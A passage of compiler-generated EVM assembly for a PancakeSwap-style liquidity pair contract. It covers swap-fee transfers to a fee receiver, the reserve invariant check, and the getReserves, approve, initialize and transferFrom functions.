\"src/exchange-protocol/contracts/PancakePair.sol\":13199:13259  if (amount0Out > 0) _safeTransfer(_token0, FeeResiver, tax0) */\n      tag_151\n      jumpi\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13242:13252  FeeResiver */\n      sload(0x06)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13219:13259  _safeTransfer(_token0, FeeResiver, tax0) */\n      tag_151\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13233:13240  _token0 */\n      dup6\n      swap1\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13242:13252  FeeResiver */\n      and\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13254:13258  tax0 */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13219:13232  _safeTransfer */\n      tag_142\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13219:13259  _safeTransfer(_token0, FeeResiver, tax0) */\n      jump\t// in\n    tag_151:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13311:13325  amount1Out > 0 */\n      dup14\n      iszero\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13307:13367  if (amount1Out > 0) _safeTransfer(_token1, FeeResiver, tax1) */\n      tag_153\n      jumpi\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13350:13360  FeeResiver */\n      sload(0x06)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13327:13367  _safeTransfer(_token1, FeeResiver, tax1) */\n      tag_153\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13341:13348  _token1 */\n      dup5\n      swap1\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13350:13360  FeeResiver */\n      and\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13362:13366  tax1 */\n      dup4\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13327:13340  _safeTransfer */\n      tag_142\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13327:13367  _safeTransfer(_token1, FeeResiver, tax1) */\n      jump\t// in\n    tag_153:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13426:13466  IERC20(_token0).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13460:13464  this */\n      address\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13426:13466  IERC20(_token0).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13426:13451  IERC20(_token0).balanceOf */\n      dup7\n      and\n      swap2\n      0x70a08231\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13426:13466  IERC20(_token0).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup4\n      add\n      swap3\n      0x20\n      swap3\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13426:13451  IERC20(_token0).balanceOf */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13426:13466  IERC20(_token0).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_154\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_154:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13426:13466  IERC20(_token0).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_155\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_155:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13426:13466  IERC20(_token0).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_156\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_156:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13426:13466  IERC20(_token0).balanceOf(address(this)) */\n      mload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13491:13531  IERC20(_token1).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13525:13529  this */\n      address\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13491:13531  IERC20(_token1).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13426:13466  IERC20(_token0).balanceOf(address(this)) */\n      swap2\n      swap10\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13491:13516  IERC20(_token1).balanceOf */\n      dup6\n      and\n      swap2\n      0x70a08231\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13491:13531  IERC20(_token1).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup3\n      add\n      swap3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13426:13466  IERC20(_token0).balanceOf(address(this)) */\n      0x20\n      swap3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13491:13531  IERC20(_token1).balanceOf(address(this)) */\n      swap1\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13491:13516  IERC20(_token1).balanceOf */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13491:13531  IERC20(_token1).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_157\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_157:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13491:13531  IERC20(_token1).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_158\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_158:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13491:13531  IERC20(_token1).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_159\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_159:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13491:13531  IERC20(_token1).balanceOf(address(this)) */\n      mload\n      swap7\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13551:13565  uint amount0In */\n      0x00\n      swap6\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13579:13601  _reserve0 - amount0Out */\n      dup6\n      and\n      dup11\n      swap1\n      sub\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13568:13601  balance0 > _reserve0 - amount0Out */\n      dup4\n      gt\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13568:13667  balance0 > _reserve0 - amount0Out... */\n      tag_160\n      jumpi\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13666:13667  0 */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13568:13667  balance0 > _reserve0 - amount0Out... */\n      jump(tag_161)\n    tag_160:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13640:13650  amount0Out */\n      dup10\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13628:13637  _reserve0 */\n      dup6\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13628:13650  _reserve0 - amount0Out */\n      and\n      sub\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13616:13624  balance0 */\n      dup4\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13616:13651  balance0 - (_reserve0 - amount0Out) */\n      sub\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13568:13667  balance0 > _reserve0 - amount0Out... */\n    tag_161:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13551:13667  uint amount0In = balance0 > _reserve0 - amount0Out... */\n      swap1\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13677:13691  uint amount1In */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13717:13727  amount1Out */\n      dup10\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13705:13714  _reserve1 */\n      dup6\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13705:13727  _reserve1 - amount1Out */\n      and\n      sub\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13694:13702  balance1 */\n      dup4\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13694:13727  balance1 > _reserve1 - amount1Out */\n      gt\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13694:13793  balance1 > _reserve1 - amount1Out... */\n      tag_162\n      jumpi\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13792:13793  0 */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13694:13793  balance1 > _reserve1 - amount1Out... */\n      jump(tag_163)\n    tag_162:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13766:13776  amount1Out */\n      dup10\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13754:13763  _reserve1 */\n      dup6\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13754:13776  _reserve1 - amount1Out */\n      and\n      sub\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13742:13750  balance1 */\n      dup4\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13742:13777  balance1 - (_reserve1 - amount1Out) */\n      sub\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13694:13793  balance1 > _reserve1 - amount1Out... */\n    tag_163:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13677:13793  uint amount1In = balance1 > _reserve1 - amount1Out... */\n      swap1\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13836:13837  0 */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13824:13833  amount0In */\n      dup3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13824:13837  amount0In > 0 */\n      gt\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13824:13854  amount0In > 0 || amount1In > 0 */\n      dup1\n      tag_164\n      jumpi\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13853:13854  0 */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13841:13850  amount1In */\n      dup2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13841:13854  amount1In > 0 */\n      gt\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13824:13854  amount0In > 0 || amount1In > 0 */\n    tag_164:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13803:13914  require(... */\n      tag_165\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x22\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_50b0a6dd250a09c1cd083ad4bf9f97424665d60e7bc0a208a1151c7d0051999c\n      0x22\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_165:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14014:14035  uint balance0Adjusted */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14056:14098  balance0.mul(10000).sub(amount0In.mul(25)) */\n      tag_166\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14080:14097  amount0In.mul(25) */\n      tag_167\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14080:14089  amount0In */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14094:14096  25 */\n      0x19\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14080:14097  amount0In.mul(25) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14080:14093  amount0In.mul */\n      tag_168\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14080:14097  amount0In.mul(25) */\n      and\n      jump\t// in\n    tag_167:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14056:14075  balance0.mul(10000) */\n      tag_169\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14056:14064  balance0 */\n      dup8\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14069:14074  10000 */\n      0x2710\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14056:14075  balance0.mul(10000) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14056:14068  balance0.mul */\n      tag_168\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14056:14075  balance0.mul(10000) */\n      and\n      jump\t// in\n    tag_169:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14056:14079  balance0.mul(10000).sub */\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14056:14098  balance0.mul(10000).sub(amount0In.mul(25)) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14056:14079  balance0.mul(10000).sub */\n      tag_170\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14056:14098  balance0.mul(10000).sub(amount0In.mul(25)) */\n      and\n      jump\t// in\n    tag_166:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14014:14112  uint balance0Adjusted = (... */\n      swap1\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14126:14147  uint balance1Adjusted */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14168:14210  balance1.mul(10000).sub(amount1In.mul(25)) */\n      tag_171\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14192:14209  amount1In.mul(25) */\n      tag_167\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14192:14201  amount1In */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14206:14208  25 */\n      0x19\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14192:14209  amount1In.mul(25) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14192:14205  amount1In.mul */\n      tag_168\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14192:14209  amount1In.mul(25) */\n      and\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14168:14210  balance1.mul(10000).sub(amount1In.mul(25)) */\n    tag_171:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14126:14224  uint balance1Adjusted = (... */\n      swap1\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14325:14371  uint(_reserve0).mul(_reserve1).mul(10000 ** 2) */\n      tag_174\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14360:14370  10000 ** 2 */\n      0x05f5e100\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14325:14355  uint(_reserve0).mul(_reserve1) */\n      tag_175\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14325:14340  uint(_reserve0) */\n      dup12\n      dup2\n      and\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14325:14355  uint(_reserve0).mul(_reserve1) */\n      dup12\n      and\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14325:14344  uint(_reserve0).mul */\n      tag_168\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14325:14355  uint(_reserve0).mul(_reserve1) */\n      and\n      jump\t// in\n    tag_175:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14325:14359  uint(_reserve0).mul(_reserve1).mul */\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14325:14371  uint(_reserve0).mul(_reserve1).mul(10000 ** 2) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14325:14359  uint(_reserve0).mul(_reserve1).mul */\n      tag_168\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14325:14371  uint(_reserve0).mul(_reserve1).mul(10000 ** 2) */\n      and\n      jump\t// in\n    tag_174:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14263:14301  balance0Adjusted.mul(balance1Adjusted) */\n      tag_176\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14263:14279  balance0Adjusted */\n      dup4\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14284:14300  balance1Adjusted */\n      dup4\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14263:14301  balance0Adjusted.mul(balance1Adjusted) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14263:14283  balance0Adjusted.mul */\n      tag_168\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14263:14301  balance0Adjusted.mul(balance1Adjusted) */\n      and\n      jump\t// in\n    tag_176:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14263:14371  balance0Adjusted.mul(balance1Adjusted) >=... */\n      lt\n      iszero\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14238:14415  require(... */\n      tag_177\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x0a\n      0x24\n      dup3\n      add\n      mstore\n      shl(0xb0, 0x50616e63616b653a204b)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_177:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1357:1358  _ */\n      pop\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14436:14485  _update(balance0, balance1, _reserve0, _reserve1) */\n      tag_178\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14444:14452  balance0 */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14454:14462  balance1 */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14464:14473  _reserve0 */\n      dup9\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14475:14484  _reserve1 */\n      dup9\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14436:14443  _update */\n      tag_179\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14436:14485  _update(balance0, balance1, _reserve0, _reserve1) */\n      jump\t// in\n    tag_178:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14500:14566  Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to) */\n      0x40\n      dup1\n      mload\n      dup4\n      dup2\n      mstore\n      0x20\n      dup2\n      add\n      dup4\n      swap1\n      mstore\n      dup1\n      dup3\n      add\n      dup14\n      swap1\n      mstore\n      0x60\n      dup2\n      add\n      dup13\n      swap1\n      mstore\n      swap1\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n      dup12\n      and\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14505:14515  msg.sender */\n      caller\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14500:14566  Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to) */\n      0xd78ad95fa46c994b6551d0da85fc275fe613ce37657fb8d5e3d130840159d822\n      swap2\n      dup2\n      swap1\n      sub\n      0x80\n      add\n      swap1\n      log3\n      pop\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1379:1380  1 */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1368:1376  unlocked */\n      0x0f\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1368:1380  unlocked = 1 */\n      sstore\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":11720:14573  function swap(... */\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":217:256  string public constant name = \"KBC LPs\" */\n    tag_48:\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x07\n      dup2\n      mstore\n      0x20\n      add\n      shl(0xc8, 0x4b4243204c5073)\n      dup2\n      mstore\n      pop\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1393:1694  function getReserves()... */\n    tag_54:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1599:1607  reserve0 */\n      sload(0x0b)\n      sub(shl(0x70, 0x01), 0x01)\n      dup1\n      dup3\n      and\n      swap3\n      shl(0x70, 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1629:1637  reserve1 */\n      dup4\n      div\n      swap1\n      swap2\n      and\n      swap2\n      shl(0xe0, 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1669:1687  blockTimestampLast */\n      swap1\n      div\n      0xffffffff\n      and\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1393:1694  function getReserves()... */\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2852:2999  function approve(address spender, uint256 value) external returns (bool) {... */\n    tag_57:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2919:2923  bool */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2935:2971  _approve(msg.sender, spender, value) */\n      tag_182\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2944:2954  msg.sender */\n      caller\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2956:2963  spender */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2965:2970  value */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2935:2943  _approve */\n      tag_183\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2935:2971  _approve(msg.sender, spender, value) */\n      jump\t// in\n    tag_182:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2988:2992  true */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2852:2999  function approve(address spender, uint256 value) external returns (bool) {... */\n    tag_181:\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":700:721  address public token0 */\n    tag_59:\n      and(sub(shl(0xa0, 0x01), 0x01), sload(0x08))\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":2591:2865  function initialize(... */\n    tag_62:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":2730:2737  factory */\n      and(sub(shl(0xa0, 0x01), 0x01), sload(0x07))\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":2716:2726  msg.sender */\n      caller\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":2716:2737  msg.sender == factory */\n      eq\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":2708:2760  require(msg.sender == factory, \"Pancake: FORBIDDEN\") */\n      tag_185\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x12\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x71, 0x2830b731b0b5b29d102327a92124a22222a7)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_185:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":2790:2796  token0 */\n      0x08\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":2790:2806  token0 = _token0 */\n      dup1\n      sload\n      sub(shl(0xa0, 0x01), 0x01)\n      swap5\n      dup6\n      and\n      not(sub(shl(0xa0, 0x01), 0x01))\n      swap2\n      dup3\n      and\n      or\n      swap1\n      swap2\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":2816:2822  token1 */\n      0x09\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":2816:2832  token1 = _token1 */\n      dup1\n      sload\n      swap4\n      swap1\n      swap5\n      and\n      swap3\n      and\n      swap2\n      swap1\n      swap2\n      or\n      swap1\n      swap2\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":2842:2848  taxfee */\n      0x0a\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":2842:2858  taxfee = _taxfee */\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":2591:2865  function initialize(... */\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":349:375  uint256 public totalSupply */\n    tag_64:\n      sload(0x00)\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3150:3511  function transferFrom(... */\n    tag_67:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3281:3296  allowance[from] */\n      dup4\n      and\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3261:3265  bool */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3281:3296  allowance[from] */\n      swap1\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3281:3290  allowance */\n      0x02\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3281:3296  allowance[from] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3297:3307  msg.sender */\n      caller\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3281:3308  allowance[from][msg.sender] */\n      dup5\n      mstore\n      swap1\n      swap2\n      mstore\n      dup2\n      keccak256\n      sload\n      not(0x00)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3281:3323  allowance[from][msg.sender] != uint256(-1) */\n      eq\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3277:3448  if (allowance[from][msg.sender] != uint256(-1)) {... */\n      tag_187\n      jumpi\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3369:3384  allowance[from] */\n      dup5\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3369:3378  allowance */\n      0x02\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3369:3384  allowance[from] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3385:3395  msg.sender */\n      caller\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3369:3396  allowance[from][msg.sender] */\n      dup5\n      mstore\n      swap1\n      swap2\n      mstore\n      swap1\n      keccak256\n      sload\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3369:3437  allowance[from][msg.sender].sub(... */\n      tag_188\n      swap1\n        /* 